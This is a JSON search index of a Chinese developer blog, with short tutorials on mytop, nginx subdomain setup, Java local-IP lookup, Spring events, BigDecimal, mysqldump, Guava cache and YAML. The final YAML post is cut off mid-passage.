{"pages":[{"title":"友链","text":"排名无分先后 logo 博主 签名 Spring-一灰灰 Spring全家桶系列教程 byteblogs 前后端技术分享社区 奚新灿 Write Once, Bug Anywhere.","link":"/hexblog/link/index.html"},{"title":"关于我","text":"小灰灰Blog本人的博客大部分命名为“一灰灰Blog”，主职服务器开发 常用技术栈： Java &amp; Spring 全家桶 &amp; ibatis &amp; jooq &amp; redis &amp; mysql Python 相关网站 hhui.top: 主站 zweb: 多媒体工具网站 mweb: 中华诗词H5页 z+: quick-media集成控制台 zbook: 追小说h5,来自git开源项目修改 相关链接 个人网站 : Z+ GitHub仓库 : GitHub 开源中国 : 小灰灰blog CSDN : 小灰灰blog 博客园 : 一灰灰Blog Segment : 小灰灰Blog 云+社区 : 小灰灰 阿里云社区：一灰灰blog 掘金专栏：一灰灰 公众号 : 一灰灰blog 邮箱 : bangzewwu@126.com QQ : 3302797840 微信交流群： 关注公众号，回复 加群 相关项目简介1. Quick-Alarm通用报警框架，支持报警方式自定义，报警配置自定义，统一封装报警逻辑，简化使用 2. Quick-Media为一个提供图片 + 音频 + 视频处理的Web项目，我们的目标是封装一套多媒体文件处理的公共类库，简化各种复杂的调用 利用 spring-boot 来提供http接口实现多媒体的操作 3. Quick-SPI自定义实现的一个SPI框架，基于jdk spi, cglib动态代理, groovy引擎实现，支持运行时根据条件选择具体的spi实现 4. Quick-Crawle然后就从0到1构建了一个非常简单的爬虫框架，详细记录了如何设计一个爬虫框架的历程 5. Quick-Doraemon一个基于redis实现的配置中心框架, 做这个，纯粹是为了探究一下一个配置中心的实现，到底需要些什么东西，最关键的是，这个实现简不简单； 6. Quick-jsdemo纯后端套页面的插件记录 7. maven-repository基于github搭建的个人maven仓库，可以将自己做的一些项目打包到这个仓库，方便第三方依赖使用 8. PopClip工具包基于popclip实现的一些常用插件，可以极大的提高工作效率 9. Chrome-Coder写的一个chrome扩展工具，提供时间戳/日期的转换，提供base64编码解码，url编码解码等 10. SpringBoot-DemoSpringBoot + SpringCloud + Spring Security系列教程，入门demo，实例工程 11. Quick-Fix应用内存服务访问, 应用内数据访问订正工具，借助反射 OGNL实现 12. quick-chinese-transfer基于开源项目进行封装的简繁转换的工具包，内部维护转换字典，可用于服务端 &amp; app的简繁转换场景 13. quick-algorithm常用算法工具包，如高斯消元、均摊等 更多微信公众号 &amp; 个人博客 打赏码","link":"/hexblog/about/index.html"}],"posts":[{"title":"180601-MySql性能监控工具MyTop","text":"mysql 性能监控小工具之 mytop参考： How To Use Mytop to Monitor MySQL Performance I. 安装与配置Centos 下可以直接通过yum进行安装 1yum install mytop 使用姿势和top命令一样，直接用即可 1mytop 可能提示没有权限，如下 12345678910111213141516# mytop !500Cannot connect to MySQL server. Please check the: * database you specified \"test\" (default is \"test\") * username you specified \"root\" (default is \"root\") * password you specified \"\" (default is \"\") * hostname you specified \"localhost\" (default is \"localhost\") * port you specified \"3306\" (default is 3306) * socket you specified \"\" (default is \"\")The options my be specified on the command-line or in a ~/.mytopconfig file. See the manual (perldoc mytop) for details.Here's the exact error from DBI. It might help you debug:Access denied for user 'root'@'localhost' (using password: NO) 配置文件通过上面的提示，可以添加配置文件 1234567891011121314vim ~/.mytop## 配置信息如host=localhostuser=rootpass=mypwddb=dbNameport=3306# 刷新时间，5s刷新下delay=5batchmode=0color=1idle=1 使用姿势直接将密码写到配置文件，可能并不是非常安全，可以如下操作 12mytop --prompt# 然后再窗口内输入密码即可 如果不想添加上面的配置，可以指定参数监控的db 1mytop -d dbName --prompt II. 监控与参数说明执行上面的命令之后，窗口显示内容如下 12345678910MySQL on localhost (5.7.18) up 345+19:27:20 [18:55:58] Queries: 778.2k qps: 0 Slow: 0.0 Se/In/Up/De(%): 72/00/02/00 qps now: 1 Slow qps: 0.0 Threads: 3 ( 1/ 6) 50/00/00/00 Key Efficiency: 50.0% Bps in/out: 3.3/163.3 Now in/out: 24.9/ 2.1k Id User Host/IP DB Time Cmd Query or State -- ---- ------- -- ---- --- ---------- 568 root localhost story 0 Query show full processlist 567 root localhost story 5 Sleep 541 root localhost:44568 solo 3529 Sleep 1. 参数说明第一行 1Queries: 778.2k qps: 0 Slow: 0.0 Se/In/Up/De(%): 72/00/02/00 整体信息： Queries 服务器处理过的query总数 qps 每秒处理的query数量的平均值 Slow 慢查询总数 Se/In/Up/De(%) Select,Insert,Update,Delete 各自的占比 第二行 1qps now: 1 Slow qps: 0.0 Threads: 3 ( 1/ 6) 50/00/00/00 当前的qps信息： qps now 本周期内的每秒处理query的数量 Slow qps 本周期内的每秒慢查询数量 Threads 当前连接线程数量，后面括号内的第一个数字是active状态的线程数量，第二个数字是在线程缓存中的数量 最后一列是本周期内的 Select,Insert,Update,Delete 各自的占比 第三行 1Key Efficiency: 50.0% Bps in/out: 3.3/163.3 Now in/out: 24.9/ 2.1k Key Efficiency : 表示有多少key是从缓存中读取，而不是从磁盘读取的 Bps in/out : 表示mysql平均的流入流出数据量 Now in/out : 是本周期内的流入流出数据量 剩余 后面的就是线程信息 2. 常用命令查看活动线程的详细信息，看下这个线程里面正在执行的sql是什么 按F, 然后输入线程ID 然后 e 可以查看sql的情况 查看命令执行的汇总情况 按c 退出按 t 需要更多地命令帮助 按 ? III. 其他一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/06/01/180601-MySql性能监控工具MyTop/"},{"title":"180602-nginx多域名配置","text":"nginx多域名配置原来的域名过期了，重新买了一个hhui.top，正好重新的配置一下，针对之前写过的几个不同的东西，通过不同的子域名来进行区分，因此简单记录一下nginx的多域名配置 I. 域名配置1. 背景因为资金有限，只有一台服务器，但是这个服务器上干的事情却不止一件，当前的状况是有下面几个 zweb : 一个多媒体工具网站，前端ReactJS写的，独立打包；后端为java部署在Tomcat中的应用media mweb : 古诗词wap网，每天推荐12首经典古诗词；前端ReactJS编写，独立打包；后端Java部署在Tomcat中的应用Story media：多媒体处理应用，Git开源，实现图片编辑, 二维码, markdown，svg渲染，html渲染，音频编辑等功能 Story: 古诗词的后端，提供古诗词查询，检索推荐和订阅等基本功能，未开源 一灰灰Blog 基于Hexblog搭建的个人博客 所以这台服务器上，从应用角度出发，有五个不同的功能的服务，主要区分为两类： 静态的html前端页面 部署在Tomcat上的Java应用 2. 域名配置五个服务，会配置五个不同的子域名： 将前端静态页面，在服务器上放在不同的目录下，不通的域名，映射到不同的目录 Tomcat暴露8080端口，不同的应用放在webapps下不同的目录 a. 域名与文件映射拿简单的 zweb 和 mweb 来设置，直接映射即可 12345678910111213141516171819202122232425262728293031323334353637server { listen 443 ssl; server_name zweb.hhui.top; # https 证书配置 ssl_certificate zwebcert/1529370953598.pem; ssl_certificate_key zwebcert/1529370953598.key; ssl_session_cache shared:SSL:1m; ssl_session_timeout 5m; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on; root /tmp/html/zweb;}server { listen 443 ssl; server_name mweb.hhui.top; # https 证书配置 ssl_certificate zwebcert/1529370953598.pem; ssl_certificate_key zwebcert/1529370953598.key; ssl_session_cache shared:SSL:1m; ssl_session_timeout 5m; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on; root /tmp/html/mweb;} 简单来讲，一个子域名对应一个配置项，设置其中的server_name为目标域名 然后就是设置root，映射到不同的前端地址即可 b. 博客配置映射个人博客虽然也是静态页面，但是不太一样的是博客的源码托管在git上，并借助了github的page服务，因此实际访问的域名会多一个后缀，如 1https://liuyueyi.github.io/hexblog/ 所以如果直接用上面的方法，会导致js和css文件404，主要是因为借助hexo搭建博客时，指定了path路径，所以要做一个简单的域名匹配 12345678910111213141516171819202122232425server { listen 443 ssl; server_name blog.hhui.top; ssl_certificate blogcert/1529816324478.pem; ssl_certificate_key blogcert/1529816324478.key; ssl_session_cache shared:SSL:1m; ssl_session_timeout 5m; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on; root /tmp/html/blog; location = / { index index.html; rewrite ^(.*)$ /hexblog/ break; } location / { root /tmp/html/blog; }} 上面的配置，相比较前面的，主要就是拦截了下默认的首页，强制跳转到指定的目录下 c. Tomcat代理123456789101112131415161718192021server { listen 443 ssl; server_name media.hhui.top; ssl_certificate mediacert/1528000080078.pem; ssl_certificate_key mediacert/1528000080078.key; ssl_session_cache shared:SSL:1m; ssl_session_timeout 5m; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on; root /tmp/html/media/; location / { proxy_pass http://media.hhui.top:8080/media/; proxy_redirect default; }} 常见的代理转发配置了，nginx作为代理，将请求转发到Tomcat，也就那么一个简单的配置，主要利用的是 proxy_redirect II. 小结主要记录一个简单的配置，关于nginx详细的配置相关，之前写过一个博文，加上友情链接 Nginx-路由转发配置笔记/ 上面配置体验： https://blog.hhui.top/ https://zweb.hhui.top/ https://mweb.hhui.top/ III. 其他一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/06/02/180602-nginx多域名配置/"},{"title":"170709-Java实现获取本机Ip工具类","text":"Java实现获取本机Ip的工具类获取本机Ip算是比较常见的一个需求场景了，比如业务报警，可能就会带上出问题的机器IP，方便直接上去看日志定位问题，那么问题来了，如何获取机器IP呢？ I. IpUtil工具类1. 基本方法如何获取机器Ip？如果了解InetAddress这个工具类，就很容易写出一个简单的工具类，如下 1234567public static String getLocalIP() { try { return InetAddress.getLocalHost().getHostAddress(); } catch (UnknownHostException e) { throw new RuntimeException(e); }} 上面的实现有问题么？ 当然没问题，拿我本机和阿里服务器执行一下，并没有问题如实的输出了预期的IP 本机执行后截图如下： 阿里云机器执行后截图如下： 再问一句，那是否就真的没有问题了呢？ 在某些情况下，可能返回的是 127.0.0.1 在虚拟机中执行时，就可能遇到这个问题，截图如下 2. 进阶版做一点简单的改动，获取IpV4的地址，源码如下 123456789101112131415161718192021222324/** * 直接根据第一个网卡地址作为其内网ipv4地址，避免返回 127.0.0.1 * * @return */public static String getLocalIpByNetcard() { try { for (Enumeration&lt;NetworkInterface&gt; e = NetworkInterface.getNetworkInterfaces(); e.hasMoreElements(); ) { NetworkInterface item = e.nextElement(); for (InterfaceAddress address : item.getInterfaceAddresses()) { if (item.isLoopback() || !item.isUp()) { continue; } if (address.getAddress() instanceof Inet4Address) { Inet4Address inet4Address = (Inet4Address) address.getAddress(); return inet4Address.getHostAddress(); } } } return InetAddress.getLocalHost().getHostAddress(); } catch (SocketException | UnknownHostException e) { throw new RuntimeException(e); }} 再次测试，输出如下 3. 完整工具类123456789101112131415161718192021222324252627282930313233343536373839import java.net.*;import java.util.Enumeration;public class IpUtil { public static final String DEFAULT_IP = \"127.0.0.1\"; /** * 直接根据第一个网卡地址作为其内网ipv4地址，避免返回 127.0.0.1 * * @return */ public static String getLocalIpByNetcard() { try { for (Enumeration&lt;NetworkInterface&gt; e = NetworkInterface.getNetworkInterfaces(); e.hasMoreElements(); ) { NetworkInterface item = e.nextElement(); for (InterfaceAddress address : item.getInterfaceAddresses()) { if (item.isLoopback() || !item.isUp()) { continue; } if (address.getAddress() instanceof Inet4Address) { Inet4Address inet4Address = (Inet4Address) address.getAddress(); return inet4Address.getHostAddress(); } } } return InetAddress.getLocalHost().getHostAddress(); } catch (SocketException | UnknownHostException e) { throw new RuntimeException(e); } } public static String getLocalIP() { try { return InetAddress.getLocalHost().getHostAddress(); } catch (UnknownHostException e) { throw new RuntimeException(e); } }} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/07/09/170709-Java实现获取本机Ip工具类/"},{"title":"180604-之时间戳的取整小TIP","text":"时间戳的取整小TIP一个简单的背景，持有ms为单位的时间戳，需要判断两个时间戳是否为同一分钟 先将问题简化下，对s进行取整如何做？ 1time / 1000 * 1000; 也就是丢掉后面的三位数；那么对分钟取整呢？ 1time / 60000 * 60000; 其实思路和对整百的取整一样，唯一让人感到违和的可能就是时间是60进制的形式，导致一眼看上去，有点诡异 II. 其他一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/06/04/180604-之时间戳的取整小TIP/"},{"title":"180607-手写定长数组","text":"手写定长数组有个背景场景如下： 一天划分为1440分钟，每分钟记录一个数据块，然后用一个数据结构存储着1440个数据块，随着时间的推移，每过一分钟，向这个数据结构中添加一块，并移除最前的那个；其次就是我希望根据当前的时间，可以获取往前n分钟的数据块 简单来说，上面的需求解析如下： 一个数组，容量为1440 频繁的新增和删除 随机的访问 后面两个就限制了ArrayList和LinkedList的使用场景了，所以为了满足这个场景，然后写了一个简单的数据结构 I. 滑动定长数组来两个偏移量，将数组看成一个循环的结构，一个Start，一个End，分别记录开始和结束，直接在End处添加数据，每次删start处的数据；定位则计算与End或者Start的偏移量来做，超简单的实现如下： 12345678910111213141516171819202122232425262728293031323334353637383940 @SuppressWarnings(\"unchecked\")public static class DArray&lt;T&gt; { private Object[] arys; private int size; private int start; private int end; @Getter private int capacity; public DArray(int size) { this.size = size; this.arys = new Object[size]; start = 0; end = start; capacity = 0; } public void add(T obj) { arys[end] = obj; end = (++end) % size; ++capacity; } public T remove() { if (capacity == 0) { return null; } Object obj = arys[start]; arys[start] = null; start = (++start) % size; --capacity; return (T) obj; } public T index(int index) { return (T) arys[(start + index) % size]; }} II. 其他一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/06/07/180607-手写定长数组/"},{"title":"180609-Spring之事件驱动机制的简单使用","text":"Spring之事件驱动机制的简单使用关于事件的发起与相应，在客户端的交互中可算是非常频繁的事情了，关于事件的发布订阅，在Java生态中，EventBus可谓是非常有名了，而Spring也提供了事件机制，本文则主要介绍后端如何在Spring的环境中，使用事件机制 I. 使用姿势主要借助org.springframework.context.ApplicationEventPublisher#publishEvent(org.springframework.context.ApplicationEvent) 来发布事件，而接受方，则直接在处理的方法上，添加 @@EventListener注解即可 1. 事件定义发布一个事件，所以第一件事就是要定义一个事件，对Spring而言，要求自定义的事件继承自ApplicationEvent类, 一个简单的demo如下 123456789public class NotifyEvent extends ApplicationEvent { @Getter private String msg; public NotifyEvent(Object source, String msg) { super(source); this.msg = msg; }} 2. 发布事件发布时间则比较简单，直接拿到ApplicationContext实例，执行publish方法即可，如下面给出一个简单的发布类 123456789101112131415161718@Componentpublic class NotifyPublisher implements ApplicationContextAware { private ApplicationContext apc; @Override public void setApplicationContext(ApplicationContext applicationContext) throws BeansException { this.apc = applicationContext; } // 发布一个消息 public void publishEvent(int status, String msg) { if (status == 0) { apc.publishEvent(new NotifyEvent(this, msg)); } else { apc.publishEvent(new NewNotifyEvent(this, msg, ((int) System.currentTimeMillis() / 1000))); } }} 3. 事件监听器在方法上添加注解即可，如下 123456789101112131415161718192021222324@Componentpublic class NotifyQueueListener { @EventListener public void consumerA(NotifyEvent notifyEvent) { try { Thread.sleep(5000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\"A: \" + Thread.currentThread().getName() + \" | \" + notifyEvent.getMsg()); } @EventListener public void consumerB(NewNotifyEvent notifyEvent) { System.out.println(\"B: \" + Thread.currentThread().getName() + \" | \" + notifyEvent.getMsg()); } @EventListener public void consumerC(NotifyEvent notifyEvent) { System.out.println(\"C: \" + Thread.currentThread().getName() + \" | \" + notifyEvent.getMsg()); }} II. 疑问及解答1. 发布与监听器的关联上面给出了使用的姿势，看起来并不复杂，也比较容易使用，但是一个问题需要在使用之前弄明白了，发布事件和监听器是怎么关联起来的呢？ 根据方法的参数类型执行 那么如果发布者，推送的是一个NotifyEvent类型的事件，那么接收者是怎样的呢？ 参数为NotifyEvent以及其子类的监听器，都可以接收到消息 测试用例如下: NewNotifyEvent 继承自上面的NotifyEvent 123456789101112public class NewNotifyEvent extends NotifyEvent { @Getter private int version; public NewNotifyEvent(Object source, String msg) { super(source, msg); } public NewNotifyEvent(Object source, String msg, int version) { super(source, msg); this.version = version; }} 然后借助上面的消息发布者发送一个消息 123456@Testpublic void testPublishEvent() throws InterruptedException { notifyPublisher.publishEvent(1, \"新的发布事件! NewNotify\"); System.out.println(\"---------\"); notifyPublisher.publishEvent(0, \"旧的发布事件! Notify\");} 输出结果如下，对于NewNotifyEvent, 参数类型为NotifyEvent的consumerA, consumerC都可以接收到 123456A: main | 新的发布事件! NewNotifyC: main | 新的发布事件! NewNotifyB: main | 新的发布事件! NewNotify---------A: main | 旧的发布事件! NotifyC: main | 旧的发布事件! Notify 2. 消息接收的顺序上面消息处理是串行的，那么先后顺序怎么确定？ (下面的答案不确定，有待深入源码验证！！！） 先扫描到的bean先处理 同一个bean中，按精确匹配，先后定义顺序进行 3. 异步消费对于异步消费，即在消费者方法上添加一个@Async注解，并需要在配置文件中，开启异步支持 12345@Async@EventListenerpublic void processNewNotifyEvent(NewNotifyEvent newNotifyEvent) { System.out.println(\"new notifyevent: \" + newNotifyEvent.getMsg() + \" : \" + newNotifyEvent.getVersion());} 配置支持 1234567891011121314@Configuration@EnableAsyncpublic class AysncListenerConfig implements AsyncConfigurer { /** * 获取异步线程池执行对象 * * @return */ @Override public Executor getAsyncExecutor() { return new ThreadPoolExecutor(5, 10, 1, TimeUnit.MINUTES, new LinkedBlockingQueue&lt;Runnable&gt;(), new DefaultThreadFactory(\"test\"), new ThreadPoolExecutor.CallerRunsPolicy()); }} III. 其他一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/06/09/180609-Spring之事件驱动机制的简单使用/"},{"title":"180606-Linux下jdk中文乱码问题解决","text":"linux下jdk中文乱码问题解决之前遇到过一次中文乱码问题，是通过在jdk的jre目录下的lib/fonts文件中添加simsun.ttf字体文件解决，但是这次遇到一个奇怪的问题，同样的字体拷贝过去后，中文不乱但是英文乱码了 记录一下解决过程： 主要思路就是给系统安装中文字体，让系统本身就支持中文即可 字体安装过程 cp simsun.ttc /usr/share/fonts/chinese下 修改权限 chmod 777 simsun.ttc 安装字体: 12cd /usr/share/fonts/chinesefc-cache -fv 查看系统安装的字体: fc-list 重启Tomcat jdk安装字体将文件拷贝到对应的目录下即可 12345cp simsun.ttc /usr/java/jdk1.8.0_131/jre/lib/fonts/## 重启Tomcat/user/local/tomcat/bin/shutdown.sh/user/local/tomcat/bin/catalina.sh start II. 其他一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/06/06/180606-Linux下jdk中文乱码问题解决/"},{"title":"180615-精度计算BigDecimal","text":"180615-精度计算BigDecimal目前接触的业务中，对数据的精度要求比较高，因此不再使用基本的float,double，改为用BigDecimal进行存储和相关的计算，端午前的这一篇博文，则简单的介绍下BigDecimal的使用姿势，早点回家早点放假 I. 基本使用1. 构造方法几个常见的构造方式，将基本类型+String等，转换为BigDecimal对象 123456public BigDecimal(char[] in);public BigDecimal(String val);public BigDecimal(BigInteger val);public BigDecimal(int val);public BigDecimal(long val);public BigDecimal(double val) 2. 加减乘除1234567public BigDecimal add(BigDecimal value); //加法public BigDecimal subtract(BigDecimal value); //减法 public BigDecimal multiply(BigDecimal value); //乘法public BigDecimal divide(BigDecimal value); //除法 从上面的签名上，可以看出操作是属于链式结构（Builder模式），然后一个问题就是执行上面的操作之后，被调用的对象，是否会发生修改? (即下面的测试中的o值是否改变) 1234567@Testpublic void testBigDecimal() { BigDecimal o = new BigDecimal(11.1); BigDecimal d = new BigDecimal(1); System.out.println(o.add(d) + \"| \" + o);} 输出结果 112.0999999999999996447286321199499070644378662109375| 11.0999999999999996447286321199499070644378662109375 结论： 计算后的结果需要保存，因为不会修改目标对象的值 3. 精度前面的例子中，输出后面一长串，而这往往并不是我们希望的，所以可以设置下精度 1public BigDecimal setScale(int newScale, RoundingMode roundingMode); 一个简单的case如下 12345@Testpublic void testBigDecimal() { BigDecimal o = new BigDecimal(11.1); System.out.println(o.setScale(3, RoundingMode.CEILING) + \"| \" + o);} 输出 111.100| 11.0999999999999996447286321199499070644378662109375 从上面的输出，特别是第二列，如果我们选择的精度方式是取下限，会不会有问题呢？ 12345@Testpublic void testBigDecimal() { BigDecimal o = new BigDecimal(11.1); System.out.println(o.setScale(1, RoundingMode.FLOOR) + \"| \" + o);} 输出结果为: 111.0| 11.0999999999999996447286321199499070644378662109375 所以需要注意的地方就来了，对浮点数进行精度设置时，需要根据自己的业务场景，选择合适的取整方式，不然很容易出问题 取精度的几个参数说明 12345678ROUND_CEILING //向正无穷方向舍入ROUND_DOWN //向零方向舍入ROUND_FLOOR //向负无穷方向舍入ROUND_HALF_DOWN //向（距离）最近的一边舍入，除非两边（的距离）是相等,如果是这样，向下舍入, 例如1.55 保留一位小数结果为1.5ROUND_HALF_EVEN //向（距离）最近的一边舍入，除非两边（的距离）是相等,如果是这样，如果保留位数是奇数，使用ROUND_HALF_UP，如果是偶数，使用ROUND_HALF_DOWNROUND_HALF_UP //向（距离）最近的一边舍入，除非两边（的距离）是相等,如果是这样，向上舍入, 1.55保留一位小数结果为1.6ROUND_UNNECESSARY //计算结果是精确的，不需要舍入模式ROUND_UP //向远离0的方向舍入 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/06/15/180615-精度计算BigDecimal/"},{"title":"180612-Spring之Yml配置文件加载问题","text":"Yml配置文件加载问题在resource目录下有一个application.yml文件，希望是通过@PropertySource注解，将配置文件数据读取到Environment中，然而调试发现数据始终读取不到，google之后，记录下解决方法 在测试用例中，指定初始化方式 @ContextConfiguration(classes = RedisConf.class, initializers = ConfigFileApplicationContextInitializer.class) 123456789@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration(classes = RedisConf.class, initializers = ConfigFileApplicationContextInitializer.class)public class RedisTest { @Test public void testRedis() { String ans = JedisClient.getStr(\"hello\"); System.out.println(ans); }} 对应的配置类 1234567891011121314151617181920212223242526272829303132333435@Configuration@PropertySource(value = \"classpath:application.yml\")public class RedisConf { @Autowired private Environment environment; @Autowired public RedisTemplate&lt;String, String&gt; redisTemplate(RedisConnectionFactory redisConnectionFactory) { RedisTemplate&lt;String, String&gt; redisTemplate = new RedisTemplate&lt;&gt;(); redisTemplate.setConnectionFactory(redisConnectionFactory); DefaultStrSerializer serializer = new DefaultStrSerializer(); redisTemplate.setValueSerializer(serializer); redisTemplate.setHashValueSerializer(serializer); redisTemplate.setKeySerializer(serializer); redisTemplate.setHashKeySerializer(serializer); redisTemplate.afterPropertiesSet(); JedisClient.register(redisTemplate); return redisTemplate; } @Bean public RedisConnectionFactory redisConnectionFactory() { LettuceConnectionFactory fac = new LettuceConnectionFactory(); fac.getStandaloneConfiguration().setHostName(environment.getProperty(\"spring.redis.host\")); fac.getStandaloneConfiguration().setPort(Integer.parseInt(environment.getProperty(\"spring.redis.port\"))); fac.getStandaloneConfiguration() .setPassword(RedisPassword.of(environment.getProperty(\"spring.redis.password\"))); fac.afterPropertiesSet(); return fac; }} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/06/12/180612-Spring之Yml配置文件加载问题/"},{"title":"180620-mysql之数据库导入导出","text":"mysql之数据库导入导出实际工作中，需要做一下数据库迁移，需要导入导出数据，记录一下mysqldump的简单用法 I. 导出1. 导出结构不导出数据只需要数据库的表结构，但是里面的数据不要 1mysqldump --opt -d 数据库名 -u root -p &gt; xxx.sql 2. 导出数据不导出结构数据表结构已有，但是需要里面的数据 1mysqldump -t 数据库名 -uroot -p &gt; xxx.sql 3. 导出数据和表结构1mysqldump -uroot -p -B 数据库名 --table 表名 &gt; xxx.sql II. 数据导入进入数据库，执行 1source xxx.sql III. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/06/20/180620-mysql之数据库导入导出/"},{"title":"180613-GuavaCache返回Null的注意事项","text":"GuavaCache返回Null的注意事项Guava在实际的Java后端项目中应用的场景还是比较多的，比如限流，缓存，容器操作之类的，有挺多实用的工具类，这里记录一下，在使用GuavaCache，返回null的一个问题 I. 常见使用姿势1234567891011121314151617@Testpublic void testGuava() { LoadingCache&lt;String, String&gt; cache = CacheBuilder.newBuilder().build(new CacheLoader&lt;String, String&gt;() { @Override public String load(String key) throws Exception { if (\"hello\".equals(key)) { return \"word\"; } return null; } }); String word = cache.getUnchecked(\"hello\"); System.out.println(word); System.out.println(cache.getUnchecked(\"word\"));} 上面是一个非常简单的测试case，需要注意的是，cache.get(&quot;word&quot;) 的执行，并不如逾期的返回的是null，而是会抛一个异常出来 1234wordcom.google.common.cache.CacheLoader$InvalidCacheLoadException: CacheLoader returned null for key word. at com.google.common.cache.LocalCache$Segment.getAndRecordStats(LocalCache.java:2287)... 从异常描述能看出，不允许返回null，这一块之前倒是没怎么注意，因此对于null的情况，要么定义一个标记表示不存在，要么在load()方法中主动抛一个异常出来，在使用的时候注意下，通过异常的使用方式，可以如下 12345678910public class NoVlaInGauvaException extends Exception { public NoVlaInGauvaException(String msg) { super(msg); } @Override public synchronized Throwable fillInStackTrace() { return this; }} 说明：为什么重写fillInStackTrace方法 对于这种缓存未命中的情况下，一般而言是不需要关注完整的堆栈信息的，没有数据而已，可以节省一点点性能（当然除非是在高频率的抛出时，才会有表现症状） 其次就是get与getUnchecked的区别了 get要求显示处理exception状况 getUnchecked 一般是可确认不会有问题的场景，直接调用 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/06/13/180613-GuavaCache返回Null的注意事项/"},{"title":"180619-Yaml文件语法及读写小结","text":"Yaml文件小结Yaml文件有自己独立的语法，常用作配置文件使用，相比较于xml和json而言，减少很多不必要的标签或者括号，阅读也更加清晰简单；本篇主要介绍下YAML文件的基本语法，以及如何在Java中实现读写逻辑 I. 基本语法 使用空格 Space 缩进表示分层，不同层次之间的缩进可以使用不同的空格数目，但是同层元素一定左对齐，即前面空格数目相同（不要使用tab） 